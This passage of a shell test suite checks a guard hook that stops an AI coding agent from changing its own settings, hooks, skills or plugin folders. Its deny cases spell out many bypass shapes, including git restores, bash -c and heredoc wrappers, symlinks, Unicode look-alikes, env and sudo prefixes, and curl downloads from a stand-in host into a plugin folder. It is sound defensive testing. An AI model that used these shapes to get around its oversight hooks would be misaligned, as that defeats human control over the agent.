cp "$WORK/withhooks.json" "$SD"; jq '.hooks.Stop = []' "$WORK/withhooks.json" > "$SD"
run "$GUARD" "$(bash_p "git stash")";                           expect "git stash reverts a hand edit to the hooks" deny
run "$GUARD" "$(bash_p "git checkout -- .claude")";             expect "git checkout -- .claude restores the index copy over it" deny
cp "$WORK/withhooks.json" "$SD"
OUT=$(bash_p "git checkout $REV -- ." | (cd "$P" && CLAUDE_PROJECT_DIR="$P" SETTINGS_GUARD_GIT_TIMEOUT=0.000001 "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "a git timeout denies" deny

printf '\n[095 adversarial review] shapes the first pass let through\n'
run "$GUARD" "$(bash_p "git merge --stat old")";                 expect "#1 git merge --stat is a merge" deny
run "$GUARD" "$(bash_p "git cherry-pick -n old")";               expect "#1 cherry-pick -n still writes the tree" deny
run "$GUARD" "$(bash_p "git -c alias.zz=checkout zz $REV -- .")"; expect "#2 a one-shot -c alias" deny
run "$GUARD" "$(bash_p "env git checkout $REV -- .")";          expect "#2 env git" deny
run "$GUARD" "$(bash_p "timeout 5 git checkout $REV -- .")";    expect "#2 timeout 5 git" deny
run "$GUARD" "$(bash_p "bash -c 'git checkout $REV -- .'")";    expect "#2 git inside bash -c" deny
run "$GUARD" "$(bash_p "$(printf 'bash <<X\ngit checkout %s -- .\nX' "$REV")")"; expect "#2 git inside a heredoc handed to bash" deny
run "$GUARD" "$(bash_p "$(printf 'cat >> notes.md <<X\nprose about git rm x && git am y\nX' )")"; expect "control: a heredoc handed to cat is data, not a program" none
run "$GUARD" "$(bash_p "export GIT_INDEX_FILE=/tmp/i; git checkout-index -a -f")"; expect "#3 an exported GIT_INDEX_FILE" deny
run "$GUARD" "$(bash_p "printf x | git checkout-index -f --stdin")"; expect "#4 checkout-index --stdin" deny
run "$GUARD" "$(bash_p "git am $WORK/p.mbox")";                  expect "#4 git am is not modelled" deny
run "$GUARD" "$(bash_p "$(printf "echo # '\nsed -i s/model/hooks/ .claude/settings.json\n# '")")"; expect "#5 a comment that hides a quote" deny
run "$GUARD" "$(bash_p "echo a#b; cat .claude/settings.json")"; expect "#5 control: a # inside a word is no comment" none
run "$GUARD" "$(bash_p 'echo "$(echo " # ")"; rm .claude/settings.json')"; expect "/security-review: a quote inside \$( ) does not hide a later rm" deny
run "$GUARD" "$(bash_p "echo \"\$(printf \" # \")\"; git checkout $REV -- .")"; expect "/security-review: nor a later git checkout" deny
run "$GUARD" "$(bash_p "find . -name x | xargs grep -l settings.json .claude/settings.json | xargs rm")"; expect "/security-review hint: a grep pattern exemption never hides a direct path" deny
run "$GUARD" "$(bash_p "git rm -rf .")";                         expect "#6 git rm -rf . deletes the settings file" deny
run "$GUARD" "$(bash_p "git rm --cached -r .")";                 expect "#6 control: git rm --cached keeps the file" none
run "$GUARD" "$(bash_p "git rm docs/a.txt && git commit -m x")"; expect "#6 control: a later commit does not taint an earlier verb" none
run "$GUARD" "$(bash_p "git grep -O'sed -i x' -e model -- .claude/settings.json")"; expect "#8 git grep -O runs a program" deny
run "$GUARD" "$(bash_p "git --git-dir=/tmp/e --work-tree=. diff .claude/settings.json")"; expect "#8 git --git-dir on a read" deny
run "$GUARD" "$(mcp_p() { jq -cn --arg t "$1" --argjson i "$2" --arg w "$P" '{tool_name:$t,tool_input:$i,cwd:$w}'; }; mcp_p mcp__fs__find_and_replace "$(jq -cn --arg p "$SD" '{path:$p,find:"a",replace:"b"}')")"
expect "#10 find_and_replace is not a read" deny
run "$GUARD" "$(jq -cn --arg p "file://$P/%2Eclaude/settings.json" --arg w "$P" '{tool_name:"mcp__fs__write_file",tool_input:{path:$p,content:"x"},cwd:$w}')"
expect "#10 a percent-encoded file URL" deny

printf '\n[095-R3] MCP tools  (095-AC-3, settings half)\n'
mcp_p() { jq -cn --arg t "$1" --argjson i "$2" --arg w "$P" '{tool_name:$t,tool_input:$i,cwd:$w}'; }
run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "$SD" '{path:$p,content:"{}"}')")"; expect "095-AC-3 mcp__fs__write_file to settings.json" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file '{"path":"src/a.txt","content":"x"}')";             expect "095-AC-3 mcp__fs__write_file to src/a.txt" none
run "$GUARD" "$(mcp_p mcp__fs__write_files "$(jq -cn --arg p "$SD" '{files:{($p):"{}"}}')")";  expect "threat model: the path as an object key" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file '{"dir":".cla","name":"ude/settings.json","content":"x"}')"; expect "threat model: a path split across fields" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file '{"path":"file://~/.claude/settings.json","content":"x"}')"; expect "a file:// URL under ~" deny
run "$GUARD" "$(mcp_p mcp__shell__execute_command "$(jq -cn --arg c "git checkout $REV -- ." '{command:$c}')")"; expect "threat model: a command string is judged as Bash" deny
run "$GUARD" "$(mcp_p mcp__fs__read_file "$(jq -cn --arg p "$SD" '{path:$p}')")";             expect "a read tool by name is left to the read rules" none
run "$GUARD" "$(mcp_p mcp__plugin_x_fs__edit_file "$(jq -cn --arg p "$P/.claude" '{path:$p}')")"; expect "a plugin tool naming .claude" deny

printf '\n[095a-R1 R2] a mod path is refused to the Edit tools, wherever it is  (095a-AC-1, AC-2)\n'
# HOME is $WORK/home, so ~/.claude is the fixture's config directory.
CF="$HOME/.claude"
mkdir -p "$CF/skills/plain" "$CF/plugins/cache/m/p/1" "$CF/dev-mods/s1/x"
printf -- '---\nname: plain\n---\n' > "$CF/skills/plain/SKILL.md"
MX="$P/mods/x"; MY="$P/mods/y"
mkdir -p "$MX/hooks" "$MX/lib" "$MY" "$P/.claude/skills/tla"
printf '{ "modules": ["./register.ts"] }\n' > "$MX/hooks/hooks.json"
printf 'export const register = () => {}\n' > "$MX/hooks/register.ts"
printf -- '---\nname: tla\n---\nbody\n' > "$P/.claude/skills/tla/SKILL.md"
nb_p() { jq -cn --arg p "$1" --arg w "$P" '{tool_name:"NotebookEdit",tool_input:{notebook_path:$p,new_source:"x"},cwd:$w}'; }
run "$GUARD" "$(write_p "$CF/skills/probe/.claude-plugin/plugin.json" '{"name":"probe"}')"; expect "095a-AC-1 Write of skills/probe/.claude-plugin/plugin.json" deny
case "$(reason)" in *"$CF/skills/probe/.claude-plugin/plugin.json"*) ok "  the reason names the path" ;; *) bad "  the path is not named: $(reason | head -1)" ;; esac
case "$(reason)" in *"past every hook"*) ok "  and says a loaded mod allows past every hook" ;; *) bad "  the reason does not say why: $(reason | head -2)" ;; esac
run "$GUARD" "$(edit_p "$MX/hooks/register.ts" 'export' 'export ')";       expect "095a-AC-2 Edit of mods/x/hooks/register.ts" deny
run "$GUARD" "$(write_p "$MX/lib/util.ts" 'export const a = 1')";          expect "095a-AC-2 Write of mods/x/lib/util.ts (inside a plugin folder)" deny
run "$GUARD" "$(write_p "$MY/hooks/hooks.json" '{"modules":["./r.ts"]}')"; expect "095a-AC-2 Write of mods/y/hooks/hooks.json (makes a plugin folder)" deny
run "$GUARD" "$(write_p "$MY/notes.md" 'notes')";                          expect "095a-AC-2 Write of mods/y/notes.md" none
[ -z "$OUT" ] && ok "  with no output" || bad "  the allow says something"
run "$GUARD" "$(edit_p "$P/.claude/skills/tla/SKILL.md" 'body' 'body2')";  expect "095a-AC-4 Edit of .claude/skills/tla/SKILL.md" none
run "$GUARD" "$(write_p "$CF/skills/plain/reference.md" 'x')";             expect "a reference file in an ordinary user skill" none
run "$GUARD" "$(write_p "$P/.claude/skills/z/hooks/register.ts" 'x')";     expect "R1(e) a module under a skill's hooks/" deny
run "$GUARD" "$(write_p "$CF/plugins/cache/m/p/1/hooks/hooks.json" '{}')"; expect "R1(d) the installed-plugin cache" deny
run "$GUARD" "$(write_p "$CF/plugins/known_marketplaces.json" '{}')";      expect "R1(d) known_marketplaces.json" deny
run "$GUARD" "$(write_p "$CF/dev-mods/s1/x/notes.md" 'x')";                expect "R1(d) anything under dev-mods (M2)" deny
run "$GUARD" "$(multi_p "$MX/hooks/hooks.json" '[{"old_string":"register","new_string":"evil"}]')"; expect "R2 MultiEdit in a plugin folder" deny
run "$GUARD" "$(nb_p "$MX/hooks/n.ipynb")";                                 expect "R2 NotebookEdit in a plugin folder" deny
run "$GUARD" "$(write_p "$P/a/b/.claude-plugin/x.json" '{}')";             expect "R1(a) a .claude-plugin component anywhere" deny
run "$GUARD" "$(write_p "$P/deep/hooks/hooks.json" '{}')";                 expect "R1(b) hooks/hooks.json anywhere" deny
run "$GUARD" "$(write_p "$P/deep/hook/hooks.json" '{}')";                  expect "near miss: hook/hooks.json" none
run "$GUARD" "$(write_p "$P/deep/hooks/hooks.jsonc" '{}')";                expect "near miss: hooks/hooks.jsonc" none
run "$GUARD" "$(write_p "$P/deep/claude-plugin/x.json" '{}')";             expect "near miss: claude-plugin without the dot" none
run "$GUARD" "$(write_p "$P/mods/x2/hooks/../../x/hooks/r2.ts" 'x')";      expect "a .. segment back into a plugin folder" deny
ln -s "$MX" "$P/innocent"
run "$GUARD" "$(write_p "$P/innocent/hooks/register.ts" 'x')";             expect "a symlink into a plugin folder" deny
run "$GUARD" "$(write_p "$P/innocent2/r.ts" 'x')";                         expect "control: a sibling of the symlink" none
if [ "$(uname)" = Darwin ]; then
  run "$GUARD" "$(write_p "$P/mods/y/.Claude-Plugin/plugin.json" '{}')";    expect "a case variant on a folding file system" deny
fi
run "$GUARD" "$(write_p "$MX" 'x')";                                        expect "the plugin folder itself" deny
run "$GUARD" "$(jq -cn --arg p "$P/mods/x/hooks/*.ts" --arg w "$P" '{tool_name:"Write",tool_input:{file_path:$p,content:"x"},cwd:$w}')"; expect "a glob file_path into a plugin folder" deny
mkdir -p "$WORK/pd"; printf '{}\n' > "$WORK/pd/a.ts"
run "$GUARD" "$(write_p "$WORK/pd/a.ts" 'x')";                              expect "control: a folder not on CLAUDE_CODE_PLUGIN_DIRS" none
OUT=$(write_p "$WORK/pd/a.ts" 'x' | (cd "$P" && CLAUDE_PROJECT_DIR="$P" CLAUDE_CODE_PLUGIN_DIRS="/nonexistent:$WORK/pd" "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "R1(d) a folder on CLAUDE_CODE_PLUGIN_DIRS (environment)" deny
jq --arg d "$WORK/pd" '. + {env: {CLAUDE_CODE_PLUGIN_DIRS: $d}}' "$CF/settings.json" > "$WORK/cf.json" && cp "$CF/settings.json" "$WORK/cf.bak" && cp "$WORK/cf.json" "$CF/settings.json"
run "$GUARD" "$(write_p "$WORK/pd/a.ts" 'x')";                              expect "R1(d) a folder on CLAUDE_CODE_PLUGIN_DIRS (user settings env)" deny
cp "$WORK/cf.bak" "$CF/settings.json"
D="$P/d"; i=0; while [ $i -lt 70 ]; do D="$D/d"; i=$((i+1)); done
run "$GUARD" "$(write_p "$D/f.txt" 'x')";                                   expect "R1(c) past 64 ancestor levels fails closed" deny
python3 - "$P" "$SELF_DIR" <<'PY' && ok "R1 property: 400 generated paths classify as the rules say" || bad "R1 property test"
import os, random, sys
proj, sd = sys.argv[1], sys.argv[2]
sys.path.insert(0, sd)
import settings_guard as sg
g = sg.Guarded(dict(os.environ, CLAUDE_PROJECT_DIR=proj), proj)
rnd = random.Random(95)
parts = ["a", "src", "hooks", "lib", "x.ts", "hooks.json", ".claude-plugin", "claude-plugin", ".claude", "skills", "plain", "notes.md"]
for _ in range(400):
    comps = [rnd.choice(parts) for _ in range(rnd.randint(1, 6))]
    p = os.path.join("/nonexistent-095a", *comps)
    want = (".claude-plugin" in comps) or comps[-2:] == ["hooks", "hooks.json"]
    for i in range(len(comps) - 1):
        if comps[i] == ".claude" and comps[i + 1] == "skills":
            rest = comps[i + 2:]
            want = want or len(rest) <= 1 or rest[1] == "hooks"
    got = g.mod_of(p) is not None
    if got != want:
        print("mismatch", p, "want", want, "got", got)
        sys.exit(1)
PY

printf '\n[095a-R3] the shell may read a plugin folder and not write one  (095a-AC-1, AC-4)\n'
run "$GUARD" "$(bash_p "$(printf 'mkdir -p %s/skills/probe/hooks && cat > %s/skills/probe/hooks/hooks.json <<EOF\n{"modules":["./r.ts"]}\nEOF' "$CF" "$CF")")"; expect "095a-AC-1 a heredoc into skills/probe/hooks/hooks.json" deny
run "$GUARD" "$(bash_p "cp -r /tmp/m $CF/skills/probe")";                   expect "095a-AC-1 cp -r of a prepared folder into the user skills root" deny
run "$GUARD" "$(bash_p "mv /tmp/s .claude/skills/tla")";                    expect "095a-AC-4 mv /tmp/s .claude/skills/tla replaces a skill folder" deny
run "$GUARD" "$(bash_p "cat mods/x/hooks/register.ts")";                    expect "095a-AC-2 cat of a module reads" none
run "$GUARD" "$(bash_p "ls ~/.claude/plugins")";                            expect "095a-AC-4 ls ~/.claude/plugins" none
run "$GUARD" "$(bash_p "git add .claude/skills/tla/SKILL.md")";             expect "095a-AC-4 git add of a SKILL.md" none
run "$GUARD" "$(bash_p "printf x > mods/x/hooks/register.ts")";             expect "a redirection into a module" deny
run "$GUARD" "$(bash_p "echo x | tee mods/x/lib/u.ts")";                    expect "tee into a plugin folder" deny
run "$GUARD" "$(bash_p "ln -s $WORK/m $CF/skills/evil")";                   expect "ln -s into the skills root" deny
run "$GUARD" "$(bash_p "tar -xf /tmp/m.tar -C $CF/skills")";               expect "tar -x -C the skills root" deny
run "$GUARD" "$(bash_p "rsync -a /tmp/m/ ~/.claude/dev-mods/s/m/")";        expect "rsync into dev-mods" deny
run "$GUARD" "$(bash_p "git clone https://example.invalid/m.git ~/.claude/skills/m")"; expect "git clone into the skills root" deny
run "$GUARD" "$(bash_p "cd mods/x && printf x > hooks/register.ts")";      expect "cd into a plugin folder, then a relative write" deny
run "$GUARD" "$(bash_p "sed -i '' s/a/b/ .claude/skills/tla/SKILL.md")";   expect "control: sed -i on a SKILL.md" none
run "$GUARD" "$(bash_p "rm mods/x/hooks/hooks.json")";                      expect "rm of a hooks.json (a removal is a write)" deny
run "$GUARD" "$(bash_p "export X=1; cat mods/x/hooks/register.ts")";       expect "a read on a tainted line" deny
run "$GUARD" "$(bash_p "grep -rn modules ~/.claude/skills")";               expect "control: grep -r over the skills root" none

printf '\n[095a-R4] git cannot bring a mod into the tree  (095a-AC-3)\n'
MR="$WORK/mrepo"; mkdir -p "$MR"; git init -q "$MR"
printf 'readme\n' > "$MR/README.md"
(cd "$MR" && git add README.md && $GC commit -qm base) || bad "fixture: mrepo base"
mkdir -p "$MR/.claude/skills/z/hooks"; printf '{"modules":["./r.ts"]}\n' > "$MR/.claude/skills/z/hooks/hooks.json"
(cd "$MR" && git add .claude && $GC commit -qm mod) || bad "fixture: mrepo mod"
MREV=$(git -C "$MR" rev-parse HEAD)
(cd "$MR" && git reset -q --hard HEAD~1) || bad "fixture: back to base"
mbash_p() { jq -cn --arg c "$1" --arg w "$MR" '{tool_name:"Bash",tool_input:{command:$c},cwd:$w}'; }
run "$GUARD" "$(mbash_p "git checkout $MREV -- .")";                       expect "095a-AC-3 git checkout REV -- ." deny
case "$(reason)" in *hooks.json*) ok "  the reason names the mod file" ;; *) bad "  the mod file is not named: $(reason | head -1)" ;; esac
run "$GUARD" "$(mbash_p "git restore --source=$MREV .")";                  expect "095a-AC-3 git restore --source=REV ." deny
run "$GUARD" "$(mbash_p "git checkout HEAD -- README.md")";                expect "095a-AC-3 git checkout HEAD -- README.md" none
[ -z "$OUT" ] && ok "  with no output" || bad "  the allow says something"
run "$GUARD" "$(mbash_p "git reset --hard $MREV")";                        expect "git reset --hard REV" deny
run "$GUARD" "$(mbash_p "git checkout $MREV -- README.md")";               expect "a pathspec that leaves the mod out" none
run "$GUARD" "$(mbash_p "git cherry-pick $MREV")";                         expect "cherry-pick of the commit that adds it" deny
run "$GUARD" "$(mbash_p "git read-tree -u -m $MREV")";                     expect "read-tree -u" deny
BLOB=$(printf '{}\n' | git -C "$MR" hash-object -w --stdin)
git -C "$MR" update-index --add --cacheinfo "100644,$BLOB,mods/q/hooks/hooks.json" || bad "fixture: index entry"
run "$GUARD" "$(mbash_p "git checkout -- .")";                             expect "plumbing: an index entry checked out" deny
(cd "$MR" && git rm -q --cached mods/q/hooks/hooks.json) || bad "fixture: drop index entry"
git -C "$MR" remote add origin "https://example.invalid/m.git" 2>/dev/null
run "$GUARD" "$(mbash_p "git pull origin main")";                          expect "M3: a pull from a configured remote" none
OUT=$(mbash_p "git checkout $MREV -- ." | (cd "$MR" && CLAUDE_PROJECT_DIR="$MR" SETTINGS_GUARD_GIT_TIMEOUT=0.000001 "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "Q20: a git timeout denies" deny
run "$GUARD" "$(mbash_p "git checkout HEAD -- .")";                        expect "control: checkout HEAD -- . changes nothing" none
(cd "$MR" && git diff HEAD "$MREV" > "$WORK/mod.diff")
run "$GUARD" "$(mbash_p "git apply $WORK/mod.diff")";                      expect "git apply of a patch that adds a hooks.json" deny

printf '\n[095a-R5] MCP tools  (095a-AC-1)\n'
run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "$CF/skills/probe/hooks/register.ts" '{path:$p,content:"x"}')")"; expect "095a-AC-1 mcp__fs__write_file to skills/probe/hooks/register.ts" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg d "$MX" '{dir:$d,name:"lib/u.ts",content:"x"}')")"; expect "a path split across fields" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "file://$MX/hooks/register.ts" '{path:$p,content:"x"}')")"; expect "a file:// URL" deny
run "$GUARD" "$(mcp_p mcp__shell__execute_command '{"command":"printf x > mods/x/hooks/register.ts"}')"; expect "a command string" deny
run "$GUARD" "$(mcp_p mcp__fs__read_file "$(jq -cn --arg p "$MX/hooks/register.ts" '{path:$p}')")"; expect "control: a read tool" none

printf '\n[095a-R10] the claude binary may not install or load a plugin\n'
run "$GUARD" "$(bash_p "claude -p hi --plugin-dir /tmp/m")";                expect "claude --plugin-dir" deny
run "$GUARD" "$(bash_p "claude plugin install x@y")";                       expect "claude plugin install" deny
run "$GUARD" "$(bash_p "claude plugin marketplace add /tmp/mk")";           expect "claude plugin marketplace add" deny
run "$GUARD" "$(bash_p "claude plugins enable x")";                         expect "claude plugins enable" deny
run "$GUARD" "$(bash_p "claude --settings /tmp/s.json -p hi")";             expect "claude --settings" deny
run "$GUARD" "$(bash_p "claude --setting-sources=user -p hi")";             expect "claude --setting-sources=" deny
run "$GUARD" "$(bash_p "CLAUDE_CODE_PLUGIN_DIRS=/tmp/m claude -p hi")";     expect "CLAUDE_CODE_PLUGIN_DIRS as a prefix" deny
run "$GUARD" "$(bash_p "export CLAUDE_CODE_PLUGIN_DIRS=/tmp/m")";           expect "export CLAUDE_CODE_PLUGIN_DIRS" deny
run "$GUARD" "$(bash_p "env FOO=1 ~/.local/share/claude/versions/2.1.288 plugin install x")"; expect "the versioned binary behind env" deny
run "$GUARD" "$(bash_p "claude plugin list")";                              expect "control: claude plugin list" none
run "$GUARD" "$(bash_p "claude plugin validate mods/y")";                   expect "control: claude plugin validate" none
run "$GUARD" "$(bash_p "claude -p 'summarise the plugin docs'")";           expect "control: claude -p with a prompt" none

printf '\n[095a-R6 R7] the hook wakes for a mod path and says so\n'
run "$GUARD" "$(write_p "$MX/lib/zz.ts" 'x')";                              expect "R6 an innocent name inside a plugin folder wakes the verdict" deny
case "$(reason)" in *"no override"*) ok "  the reason says there is no override" ;; *) bad "  no 'no override' in: $(reason | head -3)" ;; esac
case "$(reason)" in *'!'*) ok "  and names the ! route" ;; *) bad "  no ! route in the reason" ;; esac
run "$GUARD" "$(jq -cn --arg w "$MX/lib" '{tool_name:"Bash",tool_input:{command:"printf x > zz.ts"},cwd:$w}')"; expect "R6 a cwd inside a plugin folder" deny
run "$GUARD" "$(write_p "$P/src/ordinary.ts" 'x')";                         expect "control: an ordinary file still never wakes it" none

printf '\n[095a threat model] the shapes the STRIDE pass adopted\n'
run "$GUARD" "$(bash_p 'printf x > $D/skills/evil/hooks/r.ts')";            expect "TM-6 an unresolved \$D with a skills tail" deny
run "$GUARD" "$(bash_p 'cd $X/skills && tar xf /tmp/m.tar')";               expect "TM-6 a lost cd in a command naming skills" deny
run "$GUARD" "$(bash_p "cd ~/.claude/skills && git clone https://example.invalid/m.git")"; expect "TM-5 cd into the skills root, then git clone" deny
run "$GUARD" "$(bash_p "cd ~/.claude/skills && ls")";                      expect "control: cd into the skills root, then ls" none
run "$GUARD" "$(jq -cn --arg w "$CF/skills" '{tool_name:"Bash",tool_input:{command:"tar xf /tmp/m.tar"},cwd:$w}')"; expect "TM-5 a payload cwd in the skills root, then tar" deny
run "$GUARD" "$(bash_p "find .claude/skills -name SKILL.md")";              expect "TM-36 find over the project skills" none
run "$GUARD" "$(bash_p "find .claude/skills -name x -exec cp /tmp/m {} +")"; expect "TM-36 find -exec into the project skills" deny
run "$GUARD" "$(bash_p "rm -r .claude/skills/old")";                        expect "TM-37 rm -r of an old project skill" none
run "$GUARD" "$(bash_p "python3 -c 'import os; print(os.listdir(\".claude/skills\"))'")"; expect "TM-38 a python3 -c inventory of the skills" none
run "$GUARD" "$(bash_p "bash -c 'claude plugin install x@y'")";             expect "TM-18 claude plugin inside bash -c" deny
run "$GUARD" "$(bash_p "claude --plugin-dir=/tmp/m -p hi")";                expect "TM-18 --plugin-dir=" deny
run "$GUARD" "$(bash_p "claude --debug plugin install x")";                 expect "TM-18 an option before plugin" deny
run "$GUARD" "$(bash_p "claude --plugin-url https://example.invalid/m.zip -p hi")"; expect "R10 --plugin-url fetches a plugin for the session" deny
run "$GUARD" "$(bash_p "CLAUDE_CONFIG_DIR=/tmp/c claude -p hi")";           expect "TM-15 CLAUDE_CONFIG_DIR on claude" deny
run "$GUARD" "$(bash_p "HOME=/tmp/h claude -p hi")";                        expect "TM-15 HOME on claude" deny
run "$GUARD" "$(bash_p 'git commit -m "docs: CLAUDE_CODE_PLUGIN_DIRS= is read from settings"')"; expect "TM-39 the name inside a commit message" none
jq --arg d "$WORK/pd" '. + {env: {CLAUDE_CODE_PLUGIN_DIRS: $d}}' "$SD" > "$WORK/sd.json" && cp "$SD" "$WORK/sd.bak" && cp "$WORK/sd.json" "$SD"
run "$GUARD" "$(write_p "$WORK/pd/a.ts" 'x')";                              expect "TM-16 a folder on CLAUDE_CODE_PLUGIN_DIRS (project settings env)" deny
cp "$WORK/sd.bak" "$SD"
run "$GUARD" "$(write_p "$P/other/.claude/plugins/x/r.ts" 'x')";            expect "TM-21 another project's .claude/plugins" deny
run "$GUARD" "$(mcp_p mcp__docs__update '{"text":"the plugin manifest sits beside its hooks"}')"; expect "TM-31 MCP prose about plugins" none
run "$GUARD" "$(bash_p "printf 'x > mods/x/hooks/r.ts")";                   expect "an unbalanced quote naming a mod" deny
if [ "$(uname)" = Darwin ]; then
  run "$GUARD" "$(write_p "$P/deep2/hook$(printf '\xc5\xbf')/hooks.json" '{}')"; expect "TM-1 hook<long s>/hooks.json opens as hooks/hooks.json" deny
fi
BLOB=$(printf '{}\n' | git -C "$MR" hash-object -w --stdin)
git -C "$MR" update-index --add --cacheinfo "100644,$BLOB,mods/t/hooks/hooks.json" || bad "fixture: tree entry"
TREE=$(git -C "$MR" write-tree); (cd "$MR" && git rm -q --cached mods/t/hooks/hooks.json) || bad "fixture: drop tree entry"
run "$GUARD" "$(mbash_p "git read-tree -u -m $TREE")";                      expect "TM-24 read-tree of a bare tree that holds a mod" deny
run "$GUARD" "$(mbash_p "git checkout $TREE -- .")";                        expect "TM-24 checkout of a bare tree" deny
mkdir -p "$MR/mods/s/hooks"; printf '{}\n' > "$MR/mods/s/hooks/hooks.json"
(cd "$MR" && git stash -q -u) || bad "fixture: stash -u"
run "$GUARD" "$(mbash_p "git stash pop")";                                 expect "stash pop that brings an untracked mod back" deny
(cd "$MR" && git stash drop -q) || bad "fixture: stash drop"
mkdir -p "$MR/mods/u/hooks"; printf '{}\n' > "$MR/mods/u/hooks/hooks.json"
run "$GUARD" "$(mbash_p "git clean -fd")";                                  expect "git clean that removes an untracked mod" deny
rm -rf "$MR/mods/u"
run "$GUARD" "$(mbash_p "git clean -fd")";                                  expect "control: git clean with no mod in the way" none

printf '\n[095a adversarial review] shapes the first pass let through, and two it refused wrongly\n'
mkdir -p "$WORK/outside/plug/.claude-plugin" "$WORK/Dev Stuff/plug/.claude-plugin"
run "$GUARD" "$(bash_p 'n=x; cp -r /tmp/m ~/.claude/skills/$n')";             expect "#1 an unresolved name under the skills root" deny
run "$GUARD" "$(bash_p 'D=plugins; cp -r /tmp/m ~/.claude/$D/m')";           expect "#1 an unresolved folder under .claude" deny
run "$GUARD" "$(bash_p 'cat ~/.claude/skills/$n/SKILL.md')";                  expect "control: a read of an unresolved skill" none
run "$GUARD" "$(bash_p "$(printf "python3 - <<'EOF'\nopen('%s/outside/plug/x.ts','w').write('x')\nEOF" "$WORK")")"; expect "#2 a python heredoc writing into a plugin folder" deny
run "$GUARD" "$(bash_p "$(printf "cat <<'EOF'\n%s/outside/plug/x.ts\nEOF" "$WORK")")"; expect "control: a cat heredoc naming one is data" none
run "$GUARD" "$(bash_p "curl -o $WORK/outside/plug/mod.ts https://example.invalid/x")"; expect "#3 curl -o into a plugin folder outside every root" deny
run "$GUARD" "$(write_p "$WORK/cfg/$(printf '\xc5\xbf')kills/x/hook$(printf '\xc5\xbf')/hook$(printf '\xc5\xbf').json" '{}')"; expect "#4 a long-s spelling with no wake word" deny
run "$GUARD" "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "$WORK/Dev Stuff/plug/mod.ts" '{path:$p,content:"x"}')")"; expect "#5 an MCP path with a space into a plugin folder" deny
run "$GUARD" "$(bash_p "env -u FOO claude -p hi --plugin-dir /tmp/m")";      expect "#6 env -u FOO claude --plugin-dir" deny
run "$GUARD" "$(bash_p "sudo -u u claude plugin install x")";                 expect "#6 sudo -u u claude plugin install" deny
run "$GUARD" "$(bash_p 'cd "$(git rev-parse --show-toplevel)" && bash scripts/validate-hooks.sh')"; expect "#8 a lost cd, then a script with hooks in its name" none
run "$GUARD" "$(bash_p "cp -r .claude/skills/tla /tmp/x")";                   expect "#9 copying a project skill out" none
run "$GUARD" "$(bash_p "tar czf /tmp/b.tgz .claude/skills")";                 expect "#9 archiving the project skills" none
run "$GUARD" "$(bash_p "tar xzf /tmp/b.tgz -C .claude/skills")";              expect "control: extracting into them" deny
run "$GUARD" "$(bash_p "cp -r /tmp/x -t .claude/skills")";                    expect "control: cp -t into them" deny
printf '\n[095a /security-review] the pre-check fails toward the verdict\n'
run "$GUARD" "$(bash_p "cd $WORK/outside && curl -so plug/register.ts https://example.invalid/x")"; expect "SR-1 cd, then curl into a plugin folder by a relative name" deny
mkdir -p "$HOME/dev/plug/.claude-plugin"
run "$GUARD" "$(bash_p "curl -so \"\$HOME\"/dev/plug/register.ts https://example.invalid/x")"; expect "SR-1 curl into \$HOME/… that is a plugin folder" deny
mkdir -p "$WORK/q\""
run "$GUARD" "$(write_p "$WORK/q\"/../outside/plug/register.ts" 'x')";    expect "SR-2 a quote in a folder name, then .. into a plugin folder" deny
run "$GUARD" "$(write_p "$WORK/outside/notes/../plug/register.ts" 'x')";   expect "SR-2 a .. segment alone into a plugin folder" deny
run "$GUARD" "$(bash_p "curl -so $WORK/outside/notes.txt https://example.invalid/x")"; expect "control: curl to an ordinary file" none

printf '\n[sabotage] each rule is what denies its attack\n'
sabotage() { # sabotage <label> <old> <new> <payload>
  local m="$WORK/mut$PASS$FAIL"; mkdir -p "$m"; cp "$SELF_DIR"/*.sh "$SELF_DIR"/*.py "$m"/ 2>/dev/null
  python3 - "$m/settings_guard.py" "$2" "$3" <<'PY' || { bad "$1: sabotage target not found"; return; }
import sys
p, old, new = sys.argv[1:4]; s = open(p).read()
if old not in s: sys.exit(1)
open(p, "w").write(s.replace(old, new, 1))
PY
  run "$m/settings-edit-guard-hook.sh" "$4"; expect "$1" none
}
sabotage "sabotage: without the key comparison a hook removal passes" \
  'return ["settings-key", path, ",".join(keys)] if keys else ["none"]' 'return ["none"]' \
  "$(edit_p "$S" 'trust-anchor-guard-hook.sh' 'true.sh')"
sabotage "sabotage: without the read list sed -i passes" \
  'if not reads(words) or in_subst or tainted:' 'if False:' \
  "$(bash_p "sed -i '' s/a/b/ .claude/settings.json")"
sabotage "sabotage: without the redirect check printf > passes" \
  'hit = word_hit(t, g, bases, by_name, dots)' 'hit = None' \
  "$(bash_p "printf x > .claude/settings.json")"
sabotage "sabotage: without the cd bases ../.claude passes" \
  'bases.append(full)' 'pass' \
  "$(bash_p "cd sub && rm ../.claude/settings.json")"
sabotage "sabotage 095-R1: without the tree-write judge git checkout REV -- . passes" \
  '    if verb == "apply":
        if "--cached"' '    return None
    if verb == "apply":
        if "--cached"' \
  "$(bash_p "git checkout $REV -- .")"
sabotage "sabotage 095-R2: with apiKeyHelper on the safe list it passes" \
  'SAFE_KEYS = frozenset(("$schema", "language", "model"))' 'SAFE_KEYS = frozenset(("$schema", "language", "model", "apiKeyHelper"))' \
  "$(write_p "$SD" "$(jq '. + {apiKeyHelper: "/tmp/k.sh"}' "$SD")")"
sabotage "sabotage 095-R7: without the prelude check an exported GIT_EXTERNAL_DIFF passes" \
  'tainted = prelude_taints(cmds, text)' 'tainted = False' \
  "$(bash_p "export GIT_EXTERNAL_DIFF=/tmp/x; git diff .claude/settings.json")"
sabotage "sabotage 095-R3: without the MCP scan a write tool passes" \
  '        v = mcp_verdict(tool, ti, g, raw)' '        v = ["none"]' \
  "$(mcp_p mcp__fs__write_file "$(jq -cn --arg p "$SD" '{path:$p,content:"{}"}')")"
